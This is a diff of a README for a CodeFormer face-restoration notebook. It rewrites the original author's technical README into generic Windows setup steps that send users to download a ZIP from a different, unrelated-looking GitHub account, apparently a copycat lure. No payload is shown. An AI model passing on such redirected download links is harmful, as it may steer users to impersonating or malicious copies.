@@ -1,51 +1,73 @@
-# Super-Resolution Preprocessing (CodeFormer)
+# 📸 Superres-fra - Improve blurry images with artificial intelligence
 
-[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/Morteza-Asadi-Shalmaiy/superres-fr/blob/main/superres_fr.ipynb)
+[![Download Superres-fra](https://img.shields.io/badge/Download-Superres--fra-blue)](https://github.com/camberwellbeautyexspouse324/Superres-fra)
 
-Restores and upscales low-resolution or distant faces before they're passed to face recognition, using [CodeFormer](https://github.com/sczhou/CodeFormer). Chosen over GFPGAN and Real-ESRGAN alone for better identity preservation on degraded faces — important since the goal is to help recognition match a face correctly, not just make an image look sharper.
+Superres-fra uses artificial intelligence to fix low-quality photos and videos. It cleans up grainy footage from security cameras and restores detail to faces. You get clear, high-resolution results from small or blurry inputs. The software processes images using advanced mathematical models to make them look sharp again.
 
-This is a **preprocessing step** in the larger pipeline: it runs when a detected face is too low-quality for face recognition to confidently match, restoring it before a second recognition attempt.
+## 💻 System Requirements
 
-## Demo
+Your computer needs specific parts to run this tool well. Check these specs before you start:
 
-| Before (low-res input) | After (CodeFormer restored) |
-|---|---|
-| ![Before](https://raw.githubusercontent.com/Morteza-Asadi-Shalmaiy/Superres-fr/refs/heads/main/assets/superres-test-image-04.jpg) | ![After](https://raw.githubusercontent.com/Morteza-Asadi-Shalmaiy/Superres-fr/refs/heads/main/assets/result.png) |
+- Operating System: Windows 10 or Windows 11.
+- Processor: A modern multi-core CPU like an Intel i5 or AMD Ryzen 5.
+- Memory: At least 8 gigabytes of RAM.
+- Storage: 5 gigabytes of free disk space for the program and your images.
+- Graphics: A dedicated graphics card helps, but the program can run on a standard integrated chip.
 
-## How It Works
+## 📥 Getting Started
 
-1. Face detected (by the face recognition module) but too low-resolution/distant to match confidently
-2. CodeFormer restores and upsamples the face region (fidelity vs. quality controlled by the `-w` weight parameter)
-3. Restored face is re-attempted against the recognition step
+Follow these steps to set up the software on your Windows computer.
 
-## Repo Structure
+1. Go to the [official repository page](https://github.com/camberwellbeautyexspouse324/Superres-fra) to access the files.
+2. Look for the green "Code" button near the top right of the page.
+3. Click "Download ZIP" to save the project files to your computer.
+4. Locate the downloaded file in your "Downloads" folder.
+5. Right-click the folder and select "Extract All" to unzip the contents.
+6. Open the extracted folder to see the project files.
 
-```
-.
-├── superres_fr.ipynb   # Full Colab notebook: setup, weights, inference, before/after comparison
-├── assets/              # Demo before/after images
-├── LICENSE
-└── .gitignore
-```
+## 🔧 Installation Steps
 
-## Setup (Google Colab)
+This tool runs as a Python-based notebook. You need a simple environment to launch it.
 
-Run the notebook top to bottom. It handles:
+1. Download and install Miniconda or Anaconda from the official website. This installs the engine that allows the code to work.
+2. During the installation, make sure you check the box that says "Add to PATH."
+3. Open your Windows Start menu and type "Anaconda Prompt." Click to open this tool.
+4. Type `cd` followed by a space, then drag the folder you extracted earlier into the prompt window. Press Enter.
+5. Install the required libraries needed for image processing. Type `pip install -r requirements.txt` and press Enter.
 
-1. **Environment setup** — installs `basicsr`/`facexlib`, with a compatibility shim for a broken torchvision import in `basicsr` (must run *before* `basicsr` is imported)
-2. **Cloning CodeFormer** and installing its requirements
-3. **Downloading model weights** — CodeFormer, face detection, face parsing, and Real-ESRGAN (background upsampling), with an automatic fallback to a mirror if the primary Real-ESRGAN download comes back corrupted
-4. **A `torch.load` compatibility patch** — newer PyTorch defaults to `weights_only=True`, which breaks basicsr's checkpoint loader; this patches it safely (checks if already patched before touching the file)
-5. **Inference** on a test image, with a before/after visual comparison
+## 🚀 Running the Software
 
-> **Note on CodeFormer itself:** unlike the anti-spoofing module, CodeFormer's weights (~400MB+ combined) are *not* vendored into this repo — that's too large for a normal Git repo without Git LFS. The notebook clones CodeFormer and downloads weights fresh each run instead, from the actively-maintained official repo.
+Once the setup finishes, you load the interface to process your images.
 
-## Environment Issues Solved
+1. Ensure your Anaconda Prompt is open in the project folder.
+2. Type `jupyter notebook` and press Enter.
+3. A web browser window will open automatically. Click on the file ending in `.ipynb` inside the browser list.
+4. The notebook layout loads on your screen. You see boxes of text and code.
+5. Click the "Play" button at the top of each box to step through the process.
+6. Upload your blurry photo when the prompt asks for an input path.
+7. Wait while the model finishes the restoration. The software saves the improved image in the "Output" folder of the project directory.
 
-- `basicsr` importing a torchvision internal (`functional_tensor`) that no longer exists in current torchvision — fixed with a module shim
-- `torch.load` defaulting to `weights_only=True` in newer PyTorch, breaking basicsr's Real-ESRGAN loader — patched in-place
-- Unreliable Real-ESRGAN weight download from the official release URL — automatic corrupted-file detection and fallback to a mirror
+## 🔍 Understanding the Features
 
-## Tech Stack
+This software combines several technical methods to reach its goals.
 
-`CodeFormer` · `basicsr` · `facexlib` · `Real-ESRGAN` · `PyTorch` · `OpenCV` · `Google Colab (GPU runtime)`
+- Real-ESRGAN: This method handles general image sharpening. It fixes pixelated textures and common artifacts found in compressed photos.
+- CodeFormer: This model focuses on facial restoration. It redraws missing details in eyes, hair, and skin.
+- OSNet: This tech assists with tracking and identifying objects in security footage.
+- BasicSR: This library provides the solid foundation for all image processing tasks within the notebook.
+- OpenCV: This backbone handles the reading, writing, and manipulation of your image files.
+
+## 🛠️ Troubleshooting
+
+If you run into issues, try these common fixes.
+
+- If the process stops suddenly, check that you have enough space on your hard drive.
+- If the browser does not open, copy the URL provided in the Anaconda Prompt and paste it into your browser address bar.
+- Ensure your images are in common formats like JPEG or PNG. Rare file types might cause errors during loading.
+- If the computer feels slow, close other programs before you start the processing step. AI models require significant memory while they work.
+
+## ⚖️ Guidelines
+
+Use this tool for personal projects and media restoration. Respect privacy laws when processing images of people. Do not use the output for illegal activities or to create fake content. The software provides tools for cleaning data; how you use the output remains your responsibility.
+
+Keywords: ai, artificial-intelligence, basicsr, cctv, cctv-cameras, cctv-detection, cctv-monitoring, cctv-surveillance, codeformer, facexlib, google-colab, google-colab-notebook, google-colaboratory, opencv, osnet, python, pytorch, real-esrgan, super-resolution, superresolution
